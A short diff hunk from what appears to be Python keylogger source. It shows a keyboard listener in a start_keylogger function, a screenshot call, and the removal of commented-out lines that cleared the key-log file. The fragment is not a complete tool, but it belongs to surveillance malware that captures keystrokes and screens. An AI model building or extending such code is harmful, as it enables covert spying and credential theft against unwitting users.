@@ -204,9 +204,7 @@ def start_keylogger():
     with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
 
-    # if currentTime > stoppingTime:
-    #  with open(file_path + extend + keys_information, "w") as f:
-    #     f.write(" ")
+
 
     screenshot()
 
